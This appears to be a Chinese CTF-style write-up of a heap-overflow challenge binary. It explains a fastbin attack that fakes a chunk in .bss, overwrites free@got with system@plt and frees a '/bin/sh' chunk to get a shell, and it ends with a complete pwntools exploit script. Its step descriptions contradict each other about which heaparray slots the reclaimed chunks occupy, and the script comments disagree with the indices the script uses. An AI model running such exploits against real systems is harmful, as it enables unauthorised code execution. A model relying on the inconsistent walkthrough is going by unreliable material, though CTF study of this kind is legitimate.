# 执行环境
- 运行环境
  - Ubuntu 16.04 (x86_64)
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off (程序基地址固定为0x400000)
  - NX: on
  - RELRO: Partial RELRO (允许修改GOT表)
  - Canary: on (栈保护开启)
  - FORTIFY: off

# 漏洞成因
## 程序关键结构体
程序通过全局数组 `heaparray` 管理堆块指针，最多可管理10个堆块。
```c
void *heaparray[10]; // 位于.bss段，地址 0x6020e0
```

## 漏洞定位
`edit_heap` 函数中的 `read_input` 调用存在堆溢出漏洞。函数读取用户指定的 `size` 并直接用于 `read_input`，未检查该 `size` 是否超过堆块最初分配时的大小。若用户输入的 `size` 大于堆块实际大小，则可溢出并覆盖相邻堆块的数据。
```c
printf("Size of Heap : ");
read(0, buf, 8u);
v2 = atoi(buf); // v2 为用户控制的输入大小
printf("Content of heap : ");
read_input(*(&heaparray + v1), v2); // 漏洞点：使用用户输入的 v2 进行读取，可能导致堆溢出
```

# 漏洞利用过程：
利用思路是通过堆溢出篡改 `fastbin` 中空闲堆块的 `fd` 指针，使其指向 `.bss` 段中 `heaparray` 数组附近的伪造堆块。通过申请得到该伪造堆块，可以修改 `heaparray` 数组中的指针，进而实现任意地址读写。最终将 `free@got` 覆盖为 `system@plt`，并释放一个内容为 `/bin/sh` 的堆块，从而执行 `system("/bin/sh")`。

- Step 1: 创建三个大小为 0x68 的堆块 (heap0, heap1, heap2)，进行堆布局。
- Step 2: 释放 heap2，其被链入 fastbin (大小 0x71 的单项链表)。
- Step 3: 利用 heap1 的堆溢出漏洞，覆盖 heap2 的 `fd` 指针，使其指向 `.bss` 段中伪造的堆块头 (地址 `0x6020ad`)。
- Step 4: 连续申请两个 0x68 大小的堆块。第一个从 fastbin 中取出原 heap2，第二个将取到伪造的堆块 (位于 `0x6020ad`)，其用户区起始地址约为 `0x6020bd`，可覆盖 `heaparray` 数组。
- Step 5: 通过编辑伪造堆块，将 `heaparray[0]` (即 heap0 的指针) 覆盖为 `free@got` 的地址 (`0x602018`)。
- Step 6: 此时编辑 heap0，实际是编辑 `free@got` 指向的内存。将其内容覆盖为 `system@plt` 的地址 (`0x400700`)。
- Step 7: 释放 heap1 (其内容已在 Step 3 中写入了 `/bin/sh\x00`)。由于 `heaparray[1]` 指针未变，但 `free` 已被替换为 `system`，因此实际执行 `system("/bin/sh")`，获得 shell。

## Step 1
创建三个堆块，初始化 `heaparray`。
- 堆内存 `0x33fc9000` 处，此前内容为空，现在被分配为 heap0，其堆块头为 `0x0000000000000000 0x0000000000000071`，用户数据区填充为 `0x36` (`'6'`)。
- 堆内存 `0x33fc9070` 处，此前内容为空，现在被分配为 heap1，其堆块头为 `0x0000000000000000 0x0000000000000071`，用户数据区填充为 `0x36` (`'6'`)。
- 堆内存 `0x33fc90e0` 处，此前内容为空，现在被分配为 heap2，其堆块头为 `0x0000000000000000 0x0000000000000071`，用户数据区填充为 `0x36` (`'6'`)。
- 全局变量 `0x6020e0` (`heaparray`) 处，此前内容为空，现在依次存储了 heap0 (`0x33fc9010`)、heap1 (`0x33fc9080`)、heap2 (`0x33fc90f0`) 的地址。变化的原因是 `malloc` 分配成功并记录指针。

## Step 2
释放 heap2，将其链入 fastbin。
- 堆内存 `0x33fc90f0` (heap2 的用户数据区) 处，此前内容为 `0x36`，现在其前8字节（在 glibc 2.23 的 fastbin 中）被用作 `fd` 指针，指向 `NULL` (或 main_arena 的相关地址)。变化的原因是 `free` 操作将堆块标记为空闲并加入 fastbin 链表。
- 全局变量 `0x6020f0` (`heaparray[2]`) 处，此前内容为 heap2 的地址 (`0x33fc90f0`)，现在被清零 (`0x0000000000000000`)。变化的原因是 `delete_heap` 函数在 `free` 后显式将指针置零，防止 Use-After-Free。

## Step 3
编辑 heap1，利用堆溢出覆盖 heap2 的 `fd` 指针。
- 堆内存 `0x33fc9080` (heap1 的用户数据区) 处，被写入 `/bin/sh\x00` 字符串及大量零，覆盖了自身数据区。
- 堆内存 `0x33fc90e0` (heap2 的堆块头及用户数据区起始) 处，此前内容包含了 heap2 的 size 字段 (`0x71`) 和旧的 `fd` 指针。通过溢出，其 `fd` 指针被覆盖为 `0x6020ad` (一个位于 `.bss` 段的伪造堆块地址)。这使得 fastbin 链表变为：`当前空闲块 -> 伪造堆块地址`。**注意**：此步骤的调试记录中未直接显示堆内存变化，但这是利用的关键操作，通过溢出 heap1 来修改相邻的 heap2 的元数据。

## Step 4
连续申请两个堆块。
- 第一个 `add(0x68)` 从 fastbin 中取出原 heap2，其对应的 `heaparray[3]` 被赋值为 `0x33fc90f0` (原 heap2 地址)。
- 第二个 `add(0x68)` 将从 fastbin 中取出的下一个块，即 `fd` 指向的伪造堆块地址 (`0x6020ad`)。`malloc` 返回的用户区地址约为 `0x6020bd`。该地址被记录到 `heaparray[4]`。
- 全局变量 `0x6020f0` (`heaparray[2]`) 处，此前内容为 `0`，现在被赋值为 `0x33fc90f0` (原 heap2 地址)。变化的原因是第一个 `add` 操作将释放的堆块重新分配，并更新了 `heaparray`。
- 全局变量 `0x6020f8` (`heaparray[3]`) 处，此前内容为空，现在被赋值为 `0x6020bd` (伪造堆块的用户区地址)。变化的原因是第二个 `add` 操作分配了伪造的堆块。

## Step 5
通过索引 3 (对应 `heaparray[3]`，即伪造堆块) 进行编辑，覆盖 `heaparray[0]`。
- 向地址 `0x6020bd` (伪造堆块的用户区) 写入 `0x23` 个零，然后写入 `free@got` 的地址 (`0x602018`)。
- 全局变量 `0x6020e0` (`heaparray[0]`) 处，此前内容为 heap0 的地址 (`0x33fc9010`)，现在被覆盖为 `0x0000000000602018` (`free@got`)。变化的原因是伪造堆块的用户区起始于 `0x6020bd`，写入的数据恰好覆盖了其后的 `heaparray` 数组起始部分。

## Step 6
通过索引 0 (现在指向 `free@got`) 进行编辑，将 `free` 的 GOT 表项替换为 `system` 的 PLT 地址。
- 全局变量 `0x602018` (`free@got.plt`) 处，此前内容为 `free` 函数在 libc 中的实际地址 (例如 `0x7ffff7a91a70`)，现在被覆盖为 `0x0000000000400700` (`system@plt`)。变化的原因是 `edit(0, ...)` 操作向 `heaparray[0]` 所指向的地址 (`0x602018`) 写入了 `system` 的地址。

## Step 7
释放索引为 1 的堆块，触发 `system("/bin/sh")`。
- 程序调用 `free(heaparray[1])`，由于 `free@got` 已被修改为 `system@plt`，因此实际执行 `system(heaparray[1])`。
- `heaparray[1]` 指向 `0x33fc9080`，该地址在 Step 3 中被写入了字符串 `/bin/sh\x00`，因此参数为 `/bin/sh`。
- 成功启动 shell，获得控制权。

# Exploit：
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = process('./heap')
# p = remote('node4.buuoj.cn', 26065)
elf = ELF('./heap')
libc = ELF('./libc.so.6')

def add(size,content):
    p.sendlineafter(':','1')
    p.sendlineafter(':',str(size))
    p.sendafter(':',content)

def edit(idx, content):
    p.sendlineafter(':','2')
    p.sendlineafter(':',str(idx))
    p.sendlineafter(':',str(len(content)))
    p.sendafter(':',content)

def free(idx):
    p.sendlineafter(':','3')
    p.sendlineafter(':',str(idx))

# Step 1: 堆布局，创建三个堆块
add(0x68,b'6')#0 后续用于修改free@got
add(0x68,b'6')#1 用于存放/bin/sh并溢出修改heap2的fd
add(0x68,b'6')#2 用于触发fastbin attack

# Step 2: 释放heap2，使其进入fastbin
free(2)

# Step 3: 利用heap1的堆溢出，覆盖heap2的fd指针为.bss段伪造堆块地址(0x6020ad)
# 0x6020ad 处的数据布局可被解释为size=0x7f的堆块头，其用户区从0x6020bd开始
edit(1, b'/bin/sh\x00' + b'\x00'*0x60 + p64(0x71) + p64(0x6020ad))

# Step 4: 先后申请两个堆块，第二个将分配到伪造堆块
add(0x68,b'6')#3 取出原heap2
add(0x68,b'6')#4 取出伪造堆块，其用户区地址~0x6020bd，可覆盖heaparray

# Step 5: 通过伪造堆块（索引3）修改heaparray[0]为free@got地址
# 从伪造堆块用户区(0x6020bd)到heaparray[0](0x6020e0)的偏移为0x23
edit(3, b'\x00'*0x23 + p64(elf.got['free']))

# Step 6: 此时heaparray[0]指向free@got，通过编辑它将其内容改为system@plt地址
edit(0, p64(elf.plt['system']))

# Step 7: 释放heap1（内容为/bin/sh），实际执行system("/bin/sh")
free(1)

p.interactive()
```